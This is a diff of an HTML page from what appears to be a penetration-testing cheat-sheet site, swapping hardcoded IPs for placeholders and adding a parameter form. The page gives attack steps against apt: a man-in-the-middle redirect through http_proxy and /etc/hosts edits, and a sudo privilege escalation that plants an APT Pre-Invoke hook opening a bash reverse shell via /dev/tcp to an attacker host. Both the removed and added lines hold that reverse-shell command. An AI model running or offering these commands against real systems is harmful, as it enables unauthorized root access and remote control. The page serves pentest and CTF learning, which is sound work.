@@ -195,35 +195,159 @@
   <li><a href="https://tldrbins.github.io/@sudo/">Sudo</a></li>
   
 </ul>
+<hr>
+<div class="content">
+<div id="params">
+	<form id="params_form" style="display: none;">
+	</form>
+	<div class="center">
+		<button id="form_btn">Show Params Form</button>
+		<button id="replace_btn" style="display: none;">Replace Params</button>
+		<button id="reset_btn" style="display: none;">Reset</button>
+		<button id="clear_btn" style="display: none;">Clear Cache</button>
+	</div>
+</div>
 
-<div class="content"><hr>
+<style>
+#params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: white;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #aaa;
+	font-family: system-ui;
+}
+
+#params * {
+    box-sizing: border-box;
+}
+
+#params input {
+  margin-bottom: 15px;
+}
+
+#params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #f5f5f5;
+}
+
+#params label {
+	color: #333333;
+	font-size: 0.9rem;
+}
+
+#params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #f5f5f5;
+	font-weight: 700;
+	background: rgba(44, 82, 179);
+}
+
+#params button:hover {
+    cursor: pointer;
+    background: rgba(44, 82, 179, 0.95);
+}
+
+.center {
+	display: flex;
+	justify-content: center;
+	align-items: center;
+}
+
+ 
+body.dark-mode #params {
+	width: 100%;
+	margin: 0 auto;
+	background-color: #23272a;
+	padding: 20px 50px 40px;
+	box-shadow: 1px 4px 10px 1px #23272a;
+	font-family: system-ui;
+}
+
+body.dark-mode #params * {
+    box-sizing: border-box;
+}
+
+body.dark-mode #params input {
+	border-radius: 0.2em;
+	border: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input:focus {
+	margin-bottom: 15px;
+	outline: 0.1em solid #eeeeee;
+}
+
+body.dark-mode #params input[type=text] {
+	display: block;
+	height: 32px;
+	padding: 6px 16px;
+	width: 100%;
+	border: none;
+	background-color: #bdbdbd;
+}
+
+body.dark-mode #params label {
+	color: #fafafa;
+	font-size: 0.9rem;
+}
+
+body.dark-mode #params button {
+	display: inline-block;
+	margin: 20px auto 0;
+	width: 150px;
+	height: 40px;
+	border-radius: 25px;
+	border: none;
+	color: #fafafa;
+	font-weight: 700;
+	background: #616161;
+}
+
+body.dark-mode #params button:hover {
+    cursor: pointer;
+    background: #424242;
+}
+
+
+</style>
 <h3 id="mitm-man-in-the-middle">MITM (Man-in-the-Middle)</h3>
 <h4 id="1-add-proxy-path-in-target-machine">1. Add proxy path in target machine</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">http_proxy</span><span class="o">=</span>http://10.10.14.10:8888
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export http_proxy=http://&lt;LOCAL_IP&gt;:&lt;LOCAL_PROXY_PORT&gt;
+</span></span></span></code></pre></div></div>
 <h4 id="2-start-proxy-in-local-machine">2. Start proxy in local machine</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Tool</span>
-</span></span><span class="line"><span class="cl">pip3 install --upgrade proxy.py
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Start a proxy server</span>
-</span></span><span class="line"><span class="cl">proxy --hostname 0.0.0.0 --port <span class="m">8888</span>
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Tool
+</span></span><span class="line"><span class="cl"><span class="go">pip3 install --upgrade proxy.py
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Start a proxy server
+</span></span><span class="line"><span class="cl"><span class="go">proxy --hostname 0.0.0.0 --port &lt;LOCAL_PROXY_PORT&gt;
+</span></span></span></code></pre></div></div>
 <h4 id="3-redirect-traffic-to-our-server">3. Redirect traffic to our server</h4>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Edit /etc/hosts</span>
-</span></span><span class="line"><span class="cl">10.10.14.10 apt.update.example.com
-</span></span></code></pre></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Edit /etc/hosts
+</span></span><span class="line"><span class="cl"><span class="go">&lt;LOCAL_IP&gt; apt.update.example.com
+</span></span></span></code></pre></div></div>
 <br>
 <hr>
 <h3 id="sudo">SUDO</h3>
 <div>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a malicious config</span>
-</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;APT::Update::Pre-Invoke {&#34;bash -c &#39;</span><span class="se">\&#39;</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.10/1337 0&gt;&amp;1&#39;</span><span class="se">\&#39;</span><span class="s1">&#39;&#34;}&#39;</span> &gt; /etc/apt/apt.conf.d/evil
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Exploit</span>
-</span></span><span class="line"><span class="cl">sudo apt update -y
-</span></span></code></pre></div></div>
-<br></div></div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Create a malicious config
+</span></span><span class="line"><span class="cl"><span class="go">echo &#39;APT::Update::Pre-Invoke {&#34;bash -c &#39;\&#39;&#39;bash -i &gt;&amp; /dev/tcp/&lt;LOCAL_IP&gt;/&lt;LOCAL_PORT&gt; 0&gt;&amp;1&#39;\&#39;&#39;&#34;}&#39; &gt; /etc/apt/apt.conf.d/evil
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Exploit
+</span></span><span class="line"><span class="cl"><span class="go">sudo apt update -y
+</span></span></span></code></pre></div></div>
+<br>
+</div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
